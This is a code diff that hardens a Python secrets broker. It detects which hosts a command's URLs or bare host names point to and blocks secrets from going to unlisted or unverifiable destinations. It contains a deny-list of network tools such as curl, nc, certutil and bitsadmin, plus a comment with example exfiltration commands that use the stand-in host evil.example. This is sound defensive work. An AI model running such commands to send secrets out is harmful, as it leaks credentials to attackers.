@@ -14,6 +14,10 @@ from urllib.parse import urlparse
 
 PLACEHOLDER = re.compile(r"\{\{secret:([A-Za-z0-9_]+)\}\}")
 URL = re.compile(r"[A-Za-z][A-Za-z0-9+.\-]*://[^\s\"'<>|]+")
+# a site written without a scheme, as `curl evil.example/x` or `scp f user@evil.example:/x` do
+BARE_HOST = re.compile(r"(?<![\w.\-/\\])((?:[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?\.)+[a-z]{2,24}|\d{1,3}(?:\.\d{1,3}){3})(?::\d{1,5})?(?=[:/?#\\\s\"'<>|;&)]|$)", re.I)
+FILE_EXTENSIONS = frozenset("txt json xml html htm csv tsv log py js mjs ts sh md yml yaml ini cfg conf zip tar gz tgz bz2 xz bin exe dll pdf png jpg jpeg gif "
+                            "svg webp out tmp bak ps1 bat cmd sql db sqlite so o a c h cpp hpp rs go java toml lock pem key crt cer".split())
 MIN_SECRET_LENGTH = 4
 NETWORK_TOOLS = {"curl", "wget", "iwr", "irm", "invoke-webrequest", "invoke-restmethod", "nc", "ncat", "netcat",
                  "ssh", "scp", "sftp", "ftp", "telnet", "certutil", "bitsadmin"}
@@ -23,8 +27,38 @@ class SecretDestinationError(PermissionError):
     """A command would send a secret somewhere it is not allowed to go."""
 
 
+def _authority_hosts(rest: str) -> set:
+    """Every host the part after `://` can mean. Parsers disagree on a backslash and on where the user name ends, so each reading counts."""
+    out = set()
+    for cut in (re.split(r"[/?#]", rest, 1)[0], re.split(r"[/\\?#]", rest, 1)[0]):
+        for hostport in {cut.rsplit("@", 1)[-1], cut.split("@", 1)[-1]}:
+            host = hostport.strip()
+            if host.startswith("["):
+                host = host[1:].split("]", 1)[0]
+            else:
+                host = re.sub(r":\d*$", "", host)
+            if host:
+                out.add(host.lower())
+    return out
+
+
 def url_hosts(text: str) -> List[str]:
-    return sorted({(urlparse(u).hostname or "").lower() for u in URL.findall(text)} - {""})
+    hosts: set = set()
+    for u in URL.findall(text):
+        hosts |= _authority_hosts(u.split("://", 1)[1])
+    return sorted(hosts)
+
+
+def command_hosts(text: str, network_tools: Iterable[str] = ()) -> List[str]:
+    """The sites a command names: its URLs and, when it runs a network tool, also bare names and addresses."""
+    hosts = set(url_hosts(text))
+    if list(network_tools):
+        for m in BARE_HOST.finditer(URL.sub(" ", text)):
+            name = m.group(1).lower()
+            if name.rsplit(".", 1)[-1] in FILE_EXTENSIONS and not name.replace(".", "").isdigit():
+                continue                                    # a file name, not a site
+            hosts.add(name)
+    return sorted(hosts)
 
 
 class SecretsBroker:
@@ -88,6 +122,9 @@ class SecretsBroker:
                     raise SecretDestinationError(
                         f"Secret '{name}' is for local use only; it cannot be put in a command that reaches the network")
             else:
+                if tools and not hosts:
+                    raise SecretDestinationError(
+                        f"Secret '{name}' may only go to {', '.join(sorted(allowed))}; this command runs a network tool but names no site, so where it would go cannot be checked")
                 bad = [h for h in hosts if h not in allowed]
                 if bad:
                     raise SecretDestinationError(
